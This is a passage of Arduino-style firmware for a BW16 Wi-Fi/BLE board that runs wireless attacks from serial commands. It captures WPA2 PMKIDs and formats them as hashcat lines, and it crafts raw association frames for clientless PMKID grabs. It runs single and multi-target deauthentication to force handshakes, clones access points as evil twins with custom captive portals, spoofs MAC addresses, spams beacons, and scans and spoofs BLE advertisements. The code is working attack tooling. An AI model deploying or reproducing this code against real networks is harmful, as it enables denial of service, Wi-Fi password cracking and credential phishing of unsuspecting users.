// and pull the 16-byte PMKID from KDE `dd 14 00 0f ac 04`. If the AP was scanned we
// also emit a ready hashcat -m 22000 line; otherwise the raw PMKID + MACs.
#define PMKID_MAX 8
typedef struct { uint8_t ap[6], sta[6], pmkid[16]; } pmkid_t;
static pmkid_t pmkids[PMKID_MAX];
static volatile uint8_t pmkid_n = 0;
static volatile uint32_t cl_eapol = 0;   // EAPOL frames seen during a clientless grab (debug)

static void hex12(const uint8_t* m, char* out) {
  snprintf(out, 13, "%02x%02x%02x%02x%02x%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void pmkid_handle(const uint8_t* buf, unsigned len) {
  unsigned e;
  if (len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) e = 32;          // + LLC/SNAP -> EAPOL
  else if (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e) e = 34;     // QoS data
  else return;
  if (e + 99 > len) return;                    // EAPOL-Key fixed part is 95 B after hdr
  if (buf[e + 1] != 3) return;                 // EAPOL type = EAPOL-Key
  if (buf[e + 4] != 2) return;                 // RSN key descriptor
  // Key Information is big-endian; ACK = bit 7 (0x0080), MIC = bit 8 (0x0100).
  uint16_t ki = ((uint16_t)buf[e + 5] << 8) | buf[e + 6];
  if (!(ki & 0x0080) || (ki & 0x0100)) return; // M1: ACK set, MIC clear
  uint16_t kdl = ((uint16_t)buf[e + 97] << 8) | buf[e + 98];
  if (kdl < 22 || e + 99 + (unsigned)kdl > len) return;
  const uint8_t* kd = buf + e + 99;
  for (unsigned i = 0; i + 22 <= kdl; i++) {
    if (kd[i] == 0xdd && kd[i+1] == 0x14 && kd[i+2] == 0x00 &&
        kd[i+3] == 0x0f && kd[i+4] == 0xac && kd[i+5] == 0x04) {
      const uint8_t* ap = (buf[1] & 0x02) ? buf + 10 : buf + 16;   // addr2 if FromDS
      const uint8_t* sta = buf + 4;                                // addr1 = receiver
      for (uint8_t k = 0; k < pmkid_n; k++)
        if (!memcmp(pmkids[k].pmkid, kd + i + 6, 16)) return;      // dedupe
      if (pmkid_n >= PMKID_MAX) return;
      memcpy(pmkids[pmkid_n].ap, ap, 6);
      memcpy(pmkids[pmkid_n].sta, sta, 6);
      memcpy(pmkids[pmkid_n].pmkid, kd + i + 6, 16);
      pmkid_n++;
      return;
    }
  }
}

static void promisc_pmkid_cb(unsigned char* buf, unsigned int len, void* ud) {
  (void)ud;
  if (len < 34 || ((buf[0] >> 2) & 3) != 2) return;   // data frames only
  if ((buf[30] == 0x88 && buf[31] == 0x8e) || (buf[32] == 0x88 && buf[33] == 0x8e)) cl_eapol++;
  pmkid_handle(buf, len);
}

static void pmkid_stream(int ch) {
  for (uint8_t i = 0; i < pmkid_n; i++) {
    pmkid_t* p = &pmkids[i];
    char ap[13], sta[13], pm[33];
    hex12(p->ap, ap);
    hex12(p->sta, sta);
    for (int k = 0; k < 16; k++) snprintf(pm + k*2, 3, "%02x", p->pmkid[k]);
    String ssid = "";
    for (unsigned j = 0; j < scan_results.size(); j++)
      if (!memcmp(scan_results[j].bssid, p->ap, 6)) { ssid = scan_results[j].ssid; break; }
    if (ssid.length() > 0) {
      String sh = "";
      for (unsigned k = 0; k < ssid.length(); k++) { char b[3]; snprintf(b, 3, "%02x", (uint8_t)ssid[k]); sh += b; }
      String line = "WPA*01*" + String(pm) + "*" + String(ap) + "*" + String(sta) + "*" + sh + "***";
      Serial.println(line); Serial1.println(line);
    } else {
      String line = "PMKID:" + String(ap) + "|" + String(sta) + "|" + String(pm);
      Serial.println(line); Serial1.println(line);
    }
  }
  String fin = "PMKIDDONE: ch=" + String(ch) + " n=" + String((unsigned)pmkid_n);
  Serial.println(fin); Serial1.println(fin);
}

// P6 clientless PMKID: raw open-auth + WPA2-PSK assoc to make the AP start the 4-way and
// replay M1 (with the PMKID), then capture it from promisc. No client needed. The SSID is
// required — many APs reject assoc with an empty/wrong SSID.
static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
  wext_set_channel(WLAN0_NAME, ch);
  char macstr[20] = {0};
  wifi_get_mac_address(macstr);            // returns "AA:BB:CC:DD:EE:FF" as a string
  uint8_t sta[6];
  for(int i = 0; i < 6; i++) sta[i] = (uint8_t)strtoul(macstr + i * 3, NULL, 16);
  // Authentication (open system, seq 1)
  uint8_t auth[30];
  memset(auth, 0, sizeof(auth));
  auth[0] = 0xB0;
  memcpy(auth + 4, bssid, 6);
  memcpy(auth + 10, sta, 6);
  memcpy(auth + 16, bssid, 6);
  auth[26] = 0x01;   // auth seq number = 1
  wifi_tx_raw_frame(auth, 30);
  delay(30);
  // Association request (ESS + Privacy, SSID + rates + RSN WPA2-PSK/CCMP)
  uint8_t f[256];
  int n = 0;
  f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00; f[n++] = 0x00;
  memcpy(f + n, bssid, 6); n += 6;
  memcpy(f + n, sta, 6);   n += 6;
  memcpy(f + n, bssid, 6); n += 6;
  f[n++] = 0x00; f[n++] = 0x00;   // seq (set automatically)
  f[n++] = 0x11; f[n++] = 0x04;   // capability: ESS | Privacy
  f[n++] = 0x0A; f[n++] = 0x00;   // listen interval
  int sl = strlen(ssid);
  if(sl > 32) sl = 32;
  f[n++] = 0x00; f[n++] = (uint8_t)sl;
  memcpy(f + n, ssid, sl); n += sl;
  f[n++] = 0x01; f[n++] = 0x08;
  { const uint8_t r[8] = {0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24}; memcpy(f + n, r, 8); n += 8; }
  f[n++] = 0x32; f[n++] = 0x04;
  { const uint8_t r[4] = {0x30,0x48,0x60,0x6C}; memcpy(f + n, r, 4); n += 4; }
  { const uint8_t rsn[22] = {0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
    memcpy(f + n, rsn, 22); n += 22; }
  wifi_tx_raw_frame(f, n);
}

// --- A: HELLO/IDENT handshake + capability advertisement ----------------------
// Mirrors 5Ghost's HELLO -> IDENT so a host can version-check and gate features.
// caps letters (5Ghost-compatible): D=deauth S=stascan E=evil/AP B=beacon H=handshake.
// We advertise "DSEBH" (no BLE -> no L/I/C/K).
#define DELFY_FW_VERSION "1.0.0"
#define DELFY_FW_CAPS    "DSEBHLICK"

// --- C: P3 multi-target deauth list (DEAUTHADD / DEAUTHRUN) -------------------
#define DAUTH_MAX 8
typedef struct {
  uint8_t bssid[6];
  uint8_t client[6];
  uint8_t ch;
  bool have_client;
} dauth_t;
static dauth_t dauth_list[DAUTH_MAX];
static volatile uint8_t dauth_n = 0;
static volatile bool dauth_run = false;
static uint8_t dauth_idx = 0;

static void hex_to_mac(const String& h, uint8_t* out) {
  for (int i = 0; i < 6; i++)
    out[i] = (uint8_t)strtoul(h.substring(i * 2, i * 2 + 2).c_str(), NULL, 16);
}

static void dauth_add(const uint8_t* bssid, const uint8_t* client, bool have_client, uint8_t ch) {
  if (dauth_n >= DAUTH_MAX) return;
  dauth_t* t = &dauth_list[dauth_n];
  memcpy(t->bssid, bssid, 6);
  if (have_client && client) memcpy(t->client, client, 6);
  else memset(t->client, 0xFF, 6);
  t->have_client = have_client;
  t->ch = ch;
  dauth_n++;
}

// Async grab state (HSGRAB/PKGRAB). A blocking deauth burst stalls the WiFi task on
// this driver, so the deauth is driven from the main loop (same cadence as DEAUTHRUN,
// which is proven), then the state flips to promisc capture.
#define HSG_IDLE     0
#define HSG_DISCOVER 1
#define HSG_DEAUTH   2
#define HSG_CAPTURE  3
static volatile int hsg_phase = HSG_IDLE;
static volatile uint32_t hsg_t = 0;
static volatile uint32_t hsg_disc_ms = 5000;
static volatile uint32_t hsg_deauth_ms = 4000;
static volatile uint32_t hsg_cap_ms = 15000;
static volatile bool hsg_pmkid = false;
static uint8_t hsg_bssid[6];
static volatile int hsg_ch = 6;
// B: async passive CAPTURE (armed by CAPTURE, finished by loop() or CAPSTOP).
static volatile bool cap_active = false;
static volatile uint32_t cap_deadline = 0;
static volatile int cap_ch = 6;

// --- P8: BLE scan (AmebaBLE library) ---
#define BLE_MAX 16
static char ble_addr[BLE_MAX][20];
static char ble_name[BLE_MAX][24];
static char ble_tag[BLE_MAX][12];
static char ble_raw[BLE_MAX][64];   // raw advertising data as hex
static int8_t ble_rssi[BLE_MAX];
static volatile uint8_t ble_n = 0;
static BLEAdvertData ble_adv;
static BLEHIDKeyboard ble_kbd;
static BLEAdvertData ble_hidadv;

static void ble_classify(BLEAdvertData& a, char* tag, size_t cap) {
  tag[0] = '\0';
  String nm = a.getName();
  if(nm.indexOf("Flipper") >= 0) { snprintf(tag, cap, "Flipper"); return; }
  if(a.hasManufacturer()) {
    uint16_t mf = a.getManufacturer();
    if(mf == 0x004C || mf == 0x4C00) {          // Apple (FindMy trackers use type 0x12)
      uint8_t* md = a.getManufacturerData();
      uint8_t ml = a.getManufacturerDataLength();
      if(ml >= 1 && md[0] == 0x12) snprintf(tag, cap, "FindMy");
      else snprintf(tag, cap, "Apple");
    } else if(mf == 0x0006 || mf == 0x0600) {
      snprintf(tag, cap, "MS");
    } else {
      snprintf(tag, cap, "mf%04X", mf);
    }
    return;
  }
  if(nm.length() == 0) snprintf(tag, cap, "--");
}

static void ble_scan_cb(T_LE_CB_DATA* p_data) {
  ble_adv.parseScanInfo(p_data);
  BLEAddr a = ble_adv.getAddr();
  const char* as = a.str();
  char tag[12];
  ble_classify(ble_adv, tag, sizeof(tag));
  // Raw advertising data (hex) straight from the stack.
  T_LE_SCAN_INFO* si = p_data->p_le_scan_info;
  uint8_t dl = si->data_len; if(dl > 31) dl = 31;
  char raw[64]; int rp = 0;
  for(uint8_t k = 0; k < dl && rp < 60; k++) rp += snprintf(raw + rp, 3, "%02x", si->data[k]);
  raw[rp] = '\0';
  for (uint8_t i = 0; i < ble_n; i++) {
    if (strcmp(ble_addr[i], as) == 0) {          // already seen -> refresh name/tag/rssi/raw
      ble_rssi[i] = ble_adv.getRSSI();
      strncpy(ble_raw[i], raw, sizeof(ble_raw[0]) - 1);
      ble_raw[i][sizeof(ble_raw[0]) - 1] = '\0';
      if(ble_tag[i][0] == '\0' && tag[0]) { strncpy(ble_tag[i], tag, sizeof(ble_tag[0]) - 1); }
      if (ble_name[i][0] == '\0' && ble_adv.hasName()) {
        strncpy(ble_name[i], ble_adv.getName().c_str(), sizeof(ble_name[0]) - 1);
        ble_name[i][sizeof(ble_name[0]) - 1] = '\0';
      }
      return;
    }
  }
  if (ble_n >= BLE_MAX) return;
  snprintf(ble_addr[ble_n], sizeof(ble_addr[0]), "%s", as);
  ble_name[ble_n][0] = '\0';
  if (ble_adv.hasName()) {
    strncpy(ble_name[ble_n], ble_adv.getName().c_str(), sizeof(ble_name[0]) - 1);
    ble_name[ble_n][sizeof(ble_name[0]) - 1] = '\0';
  }
  strncpy(ble_tag[ble_n], tag, sizeof(ble_tag[0]) - 1);
  ble_tag[ble_n][sizeof(ble_tag[0]) - 1] = '\0';
  strncpy(ble_raw[ble_n], raw, sizeof(ble_raw[0]) - 1);
  ble_raw[ble_n][sizeof(ble_raw[0]) - 1] = '\0';
  ble_rssi[ble_n] = ble_adv.getRSSI();
  ble_n++;
}

static void ble_stream() {
  for (uint8_t i = 0; i < ble_n; i++) {
    char line[160];
    snprintf(line, sizeof(line), "BLE:%s|%d|%s|%s|%s", ble_addr[i], ble_rssi[i], ble_name[i], ble_tag[i], ble_raw[i]);
    Serial.println(line); Serial1.println(line);
  }
  String fin = "BLEDONE: n=" + String((unsigned)ble_n);
  Serial.println(fin); Serial1.println(fin);
}

void loop() {
  // Drain both UARTs fast (no per-char delay) so long chunked lines aren't dropped; we
  // only process once a full '\n'-terminated command is in.
  while (Serial1.available()) { readString += (char)Serial1.read(); }
  while (Serial.available())   { readString += (char)Serial.read(); }
  if(readString.length() > 0 && readString.charAt(readString.length() - 1) == '\n'){
    if(readString.substring(0,4)=="SCAN"){
      if(apActive)
        destroyAP();
      deauth_wifis.clear();
      DEBUG_SER_PRINT("Stop randomSSID\n");
      randomSSID = false;
      rickroll=false;
      ssid="";

      while (scanNetworks(5000)){
        delay(1000);
      }
      Serial1.print("SCAN:OK\n");
      Serial.print("SCAN:OK\n");
      
    }else if(readString.substring(0,4)=="STOP"){
      DEBUG_SER_PRINT("Stop deauthing\n");
      dauth_run = false;   // C: also disarm the multi-target deauth list
      dauth_n = 0;
      if(cap_active){ wifi_set_promisc(0, NULL, 0); hs_cap = false; cap_active = false; }
      hsg_phase = HSG_IDLE;  // abort any in-flight HSGRAB/PKGRAB
      ghostSpam = false;
      secured = false;
      strcpy(wpa_pass,"");
      if(readString.length()>5 && !apActive){
        unsigned int numStation = readString.substring(5,readString.length()-1).toInt();
        if(numStation < scan_results.size()){
          wifis_temp.clear();
          unsigned int num_st_tmp;
          
          for(unsigned int i=0; i<deauth_wifis.size(); i++){
            num_st_tmp=deauth_wifis[i];
            if(num_st_tmp != numStation){
              wifis_temp.push_back(num_st_tmp);
            }
          }
          deauth_wifis.clear();
          for(unsigned int i=0; i<wifis_temp.size(); i++){
            num_st_tmp=wifis_temp[i];
            deauth_wifis.push_back(num_st_tmp);
          }
        }
      }else{
        destroyAP();
        deauth_wifis.clear();
        DEBUG_SER_PRINT("Stop randomSSID\n");
        randomSSID = false;
        rickroll=false;
        ssid="";
      }
      digitalWrite(LED_G, 0);
       
    }else if(readString.substring(0,6)=="RANDOM"){
      DEBUG_SER_PRINT("Start randomSSID\n");
      randomSSID = true;
        
    }else if(readString.substring(0,5)=="BSSID"){
      
      ssid = readString.substring(6,readString.length()-1);
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,7)=="APSTART"){
      char ssid[33];  // o el tamaño que necesites
      
      String ap_ssid = readString.substring(8,readString.length()-1);
      ap_ssid.toCharArray(ssid, 33);
      build_portal_urls(ssid);   // portal host derives from the AP name (before createAP)
      if(secured){
        createAP(ssid, ap_channel,wpa_pass);
      }else{
        createAP(ssid,ap_channel);
      }
      DEBUG_SER_PRINT("Starting BSSID "+ap_ssid+"\n");
        if(!serveBegined){
          server.begin();
          serveBegined=true;
        }
        apActive = true;

    }else if(readString.substring(0,8)=="RICKROLL"){
      
      rickroll =true;
      DEBUG_SER_PRINT("Starting BSSID "+ssid+"\n");
       
    }else if(readString.substring(0,9)=="GHOSTSPAM"){
      ghostSpam = true;
      DEBUG_SER_PRINT("Start GHOSTSPAM\n");
    }else if(readString.substring(0,10)=="PORTALHTML"){
      // Custom portal: append hex-encoded HTML (chunked from the Flipper SD file).
      // Parse hex char-by-char (no String temporaries -> no heap churn over many chunks).
      int s1 = readString.indexOf(' ');
      String hex = (s1 > 0) ? readString.substring(s1+1, readString.length()-1) : String("");
      const char* h = hex.c_str();
      uint16_t added = 0;
      for(int i = 0; h[i] && h[i+1] && customPortalLen < sizeof(customPortal) - 1; i += 2){
        int hi = hexnib(h[i]);
        int lo = hexnib(h[i+1]);
        if(hi < 0 || lo < 0) break;
        customPortal[customPortalLen++] = (char)((hi << 4) | lo);
        added++;
      }
      customPortal[customPortalLen] = 0;
      String r = "PORTALHTML:+" + String((unsigned)added) + " total=" + String((unsigned)customPortalLen);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="PORTALCLEAR"){
      customPortalLen = 0;
      customPortal[0] = 0;
      Serial.println("PORTALCLEAR:ok"); Serial1.println("PORTALCLEAR:ok");
    }else if(readString.substring(0,10)=="PORTALHASH"){
      // Diagnostic: length + FNV-1a hash of the loaded custom portal, so we can prove the
      // bytes the board serves are identical to the SD file (catches upload corruption).
      unsigned long h = 2166136261UL;
      for(unsigned int i=0; i<customPortalLen; i++){ h ^= (uint8_t)customPortal[i]; h *= 16777619UL; }
      char b[80];
      snprintf(b, sizeof(b), "PORTALHASH:%u:%08lx", (unsigned)customPortalLen, h);
      Serial.println(b); Serial1.println(b);
    }else if(readString.substring(0,6)=="PORTAL"){
      portal = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,6)=="REASON"){
      deauth_reason = readString.substring(7,readString.length()-1).toInt();
       
    }else if(readString.substring(0,8)=="PASSWORD"){
      String password;
      password = readString.substring(9,readString.length()-1).c_str();
      password.toCharArray(wpa_pass, 64);
      Serial.println(password);
      Serial.println(wpa_pass);
      secured=true;

      
    
    }else if(readString.substring(0,7)=="CHANNEL"){
    readString.substring(8,readString.length()-1).toCharArray(ap_channel,4);


    }else if(readString.substring(0,5)=="APMAC"){
      String mac;
      mac = readString.substring(6,readString.length()-1);
      //wifi_disconnect();
      DEBUG_SER_PRINT("APMAC "+mac+"\n");
      if(mac.length()==17){
        useCustomMac=true;
        
        char macStr[18]; 
        mac.toCharArray(macStr, sizeof(macStr)); 

        char *token = strtok(macStr, ":");
        int i = 0;

        while (token != NULL && i < 6) {
            customMac[i] = strtoul(token, NULL, 16);
            token = strtok(NULL, ":");
            i++;
        }
        


        Serial.print("MAC en bytes: ");
        for (int i = 0; i < 6; i++) {
            if (customMac[i] < 0x10) Serial.print("0"); 
            Serial.print(customMac[i], HEX);
            if (i < 7) Serial.print(":");
        }
        Serial.println();
        mac.replace(":","");
        int ret = wifi_change_mac_address_from_ram(1,customMac);
        if(ret==RTW_ERROR){
          Serial1.println("ERROR:Bad Mac");
          Serial.println("ERROR:Bad Mac");
        }
      }else{
        useCustomMac=false;
      }
       
    }else if(readString.substring(0,5)=="HELLO"){
      // A: capability/handshake advertisement (5Ghost-compatible shape).
      String id = String("IDENT:brand=DELFY;fw=") + DELFY_FW_VERSION +
                  ";proto=1;caps=" + DELFY_FW_CAPS + ";board=BW16";
      Serial.println(id); Serial1.println(id);
    }else if(readString.substring(0,9)=="DEAUTHADD"){
      // C: add a target to the multi-target deauth list.
      // Args: DEAUTHADD <bssid-12hex> [client-12hex] [ch]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      String b = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      String c = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int ch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 6;
      if(b.length() != 12 || ch < 1 || ch > 165){
        Serial.println("ERR:DEAUTHADD:badargs"); Serial1.println("ERR:DEAUTHADD:badargs");
      }else if(dauth_n >= DAUTH_MAX){
        Serial.println("ERR:DEAUTHADD:full"); Serial1.println("ERR:DEAUTHADD:full");
      }else{
        uint8_t bssid[6]; hex_to_mac(b, bssid);
        uint8_t client[6]; bool have = false;
        if(c.length() == 12){ hex_to_mac(c, client); have = true; }
        dauth_add(bssid, have ? client : NULL, have, (uint8_t)ch);
        String r = "DEAUTHADD:OK n=" + String((unsigned)dauth_n);
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,9)=="DEAUTHRUN"){
      // C: arm the accumulated list (round-robin in loop()).
      dauth_run = (dauth_n > 0);
      dauth_idx = 0;
      String r = "DEAUTHRUN:" + String(dauth_run ? "on n=" : "no-targets n=") + String((unsigned)dauth_n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="DEAUTHCLEAR"){
      // C: clear the list WITHOUT the WiFi teardown that STOP does.
      dauth_run = false;
      dauth_n = 0;
      Serial.println("DEAUTHCLEAR:ok"); Serial1.println("DEAUTHCLEAR:ok");
    }else if(readString.substring(0,6)=="DEAUTH" || readString.substring(0,4)=="EVIL"){
      int numStation;
      if(readString.substring(0,4)=="EVIL"){
        numStation = readString.substring(5,readString.length()-1).toInt();
      }else{
        numStation = readString.substring(7,readString.length()-1).toInt();
      }
      if(numStation < (int)scan_results.size()&&numStation >=0){
        DEBUG_SER_PRINT("Deauthing "+(String)numStation+"\n");
        deauth_wifis.push_back(numStation);
        DEBUG_SER_PRINT("Deauthing "+scan_results[numStation].ssid+"\n");
        if(readString.substring(0,4)=="EVIL"){
          int str_len = scan_results[numStation].ssid.length() + 1; 

          // Prepare the character array (the buffer) 
          char char_array[str_len];

          // Copy it over 
          scan_results[numStation].ssid.toCharArray(char_array, str_len);
          char buffer[4];  // Suficiente para "123\0"
          itoa(scan_results[numStation].channel, buffer, 10);
          if(str_len>1)
            createAP(char_array, buffer);
          else
            Serial1.print("ERROR: BAD SSID, please try to rescan again");
        }
      

      }else{
        DEBUG_SER_PRINT("Wrong AP");
      }
      

    }else if(readString.substring(0,4)=="PING"){
      
      Serial.print("PONG\n");
      Serial1.print("PONG\n");
      
    }else if(readString.substring(0,4)=="LIST"){
      
      for (uint i = 0; i < scan_results.size(); i++) {
        Serial.print("AP:"+String(i)+"|");
        Serial.print(scan_results[i].ssid + "|");
        Serial1.print("AP:"+String(i)+"|");
        Serial1.print(scan_results[i].ssid + "|");
        {
          // %02X: bytes <0x10 must keep their leading zero, else the host's colon-stripped
          // 12-hex BSSID (used by HSGRAB/PKGRAB/DEAUTHADD) comes up short and is rejected,
          // and the info screen's MAC is wrong. (Arduino's print(x, HEX) does NOT pad.)
          char mac[18];
          snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                   scan_results[i].bssid[0], scan_results[i].bssid[1],
                   scan_results[i].bssid[2], scan_results[i].bssid[3],
                   scan_results[i].bssid[4], scan_results[i].bssid[5]);
          Serial.print(mac);
          Serial1.print(mac);
        }
        Serial.print("|" + String(scan_results[i].channel) + "|");
        Serial.print(String(scan_results[i].security) + "|");
        Serial.print(String(scan_results[i].rssi) + "\n");
        Serial1.print("|" + String(scan_results[i].channel) + "|");
        Serial1.print(String(scan_results[i].security) + "|");
        Serial1.print(String(scan_results[i].rssi) + "\n");
      }

    }else if(readString.substring(0,11)=="PROMISCTEST"){
      // GATE experiment: set channel, passively capture 802.11 frames, report counts.
      // Args: PROMISCTEST <chan> [seconds]  (default 10s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = readString.indexOf(' ', s1+1);
      int ch = readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt();
      int secs = (s2>0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      pm_total=0; pm_mgmt=0; pm_ctrl=0; pm_data=0; pm_eapol=0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      String r = "PROMISC: ch="+String(ch)+" total="+String((unsigned)pm_total)+
                 " mgmt="+String((unsigned)pm_mgmt)+" ctrl="+String((unsigned)pm_ctrl)+
                 " data="+String((unsigned)pm_data)+" eapol="+String((unsigned)pm_eapol);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="CAPTURE"){
      // P5: monitor <chan> for [secs] and stream any EAPOL (4-way) frames as HSFRAME:<hex>.
      // Passive — no injection. Args: CAPTURE <chan> [seconds]  (default 10s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // tear the softAP down first: its HTTP accept loop starves
                                  // the monitor capture (CAPTURE/HSGRAB otherwise never finish)
      hs_count = 0;
      cap_ch = ch;
      hs_cap = true;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
      cap_deadline = millis() + (uint32_t)secs * 1000u;
      cap_active = true;   // loop() finishes it after `secs`; CAPSTOP aborts early
      Serial.println("CAPTURE: armed"); Serial1.println("CAPTURE: armed");
    }else if(readString.substring(0,7)=="CAPSTOP"){
      // B: abort an in-flight capture and stream what we have.
      if(cap_active){
        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
        hs_cap = false;
        cap_active = false;
        hs_stream(cap_ch);
      }else{
        Serial.println("CAPSTOP: idle"); Serial1.println("CAPSTOP: idle");
      }
    }else if(readString.substring(0,6)=="HSGRAB"){
      // P5 active: capture on <chan> while deauthing <bssid> to force a fresh 4-way.
      // Args: HSGRAB <chan> <bssid-12hex> [seconds]  (default 10s, max 60s).
      // CAVEAT: injection during promisc is unverified on this driver — if no EAPOL lands,
      // stop, deauth in STA mode for ~2s, then run CAPTURE (clients re-assoc in 1-3s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      uint8_t bssid[6]; bool ok_bssid = (bssid_hex.length() == 12);
      for(int i=0; ok_bssid && i < 6; i++)
        bssid[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
      if(!ok_bssid){
        Serial.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
        Serial1.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
      }else{
        if(apActive) destroyAP();   // as above: no monitor capture while the softAP runs
        hs_count = 0;
        memcpy(hsg_bssid, bssid, 6);
        hsg_ch = ch;
        hsg_cap_ms = (uint32_t)secs * 1000u;
        hsg_pmkid = false;
        sta_n = 0;
        wext_set_channel(WLAN0_NAME, ch);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
        hsg_t = millis();
        hsg_phase = HSG_DISCOVER;  // discover STAs -> unicast deauth -> capture
        Serial.println("HSGRAB: armed"); Serial1.println("HSGRAB: armed");
      }
    }else if(readString.substring(0,7)=="BLESCAN"){
      // P8: BLE scan. Args: BLESCAN [secs]  (default 5s, max 30s).
      int secs = readString.substring(8, readString.length()-1).toInt();
      if(secs < 1 || secs > 30) secs = 5;
      ble_n = 0;
      BLE.init();
      BLE.configScan()->setScanMode(GAP_SCAN_MODE_ACTIVE);
      BLE.configScan()->setScanInterval(500);
      BLE.configScan()->setScanWindow(250);
      BLE.configScan()->updateScanParams();
      BLE.setScanCallback(ble_scan_cb);
      BLE.beginCentral(0);
      BLE.configScan()->startScan((uint32_t)secs * 1000u);
      ble_stream();
      BLE.end();
    }else if(readString.substring(0,10)=="BLEIBEACON"){
      // P9: advertise an iBeacon. Args: BLEIBEACON <uuid-32hex> <major> <minor> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      String uuid = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int major = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 0;
      int minor = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 0;
      int secs = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 10;
      if(secs < 1 || secs > 120) secs = 10;
      if(uuid.length() != 32){
        Serial.println("ERR:BLEIBEACON:uuid"); Serial1.println("ERR:BLEIBEACON:uuid");
      }else{
        uint8_t b[31]; uint8_t n = 0;
        b[n++]=0x02; b[n++]=0x01; b[n++]=0x06;                          // flags
        b[n++]=0x1A; b[n++]=0xFF; b[n++]=0x4C; b[n++]=0x00; b[n++]=0x02; b[n++]=0x15; // Apple iBeacon
        for(int i = 0; i < 16; i++) b[n++] = (uint8_t)strtoul(uuid.substring(i*2, i*2+2).c_str(), NULL, 16);
        b[n++]=(uint8_t)((major >> 8) & 0xFF); b[n++]=(uint8_t)(major & 0xFF);
        b[n++]=(uint8_t)((minor >> 8) & 0xFF); b[n++]=(uint8_t)(minor & 0xFF);
        b[n++]=0xC5; // tx power -59 dBm
        BLE.init();
        BLE.beginPeripheral();
        BLEAdvert* ad = BLE.configAdvert();
        ad->setAdvData(b, n);
        ad->startAdv();
        Serial.println("BLEIBEACON:on"); Serial1.println("BLEIBEACON:on");
        for(int i=0;i<secs;i++) delay(1000);
        ad->stopAdv();
        BLE.end();
        Serial.println("BLEIBEACON:off"); Serial1.println("BLEIBEACON:off");
      }
    }else if(readString.substring(0,6)=="BLEADV"){
      // P9: advertise raw adv-data bytes. Args: BLEADV <hex> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(secs < 1 || secs > 120) secs = 10;
      uint8_t buf[31]; uint8_t n = 0;
      for(int i = 0; i + 1 < (int)hex.length() && n < 31; i += 2)
        buf[n++] = (uint8_t)strtoul(hex.substring(i, i+2).c_str(), NULL, 16);
      if(n == 0){
        Serial.println("ERR:BLEADV:badhex"); Serial1.println("ERR:BLEADV:badhex");
      }else{
        BLE.init();
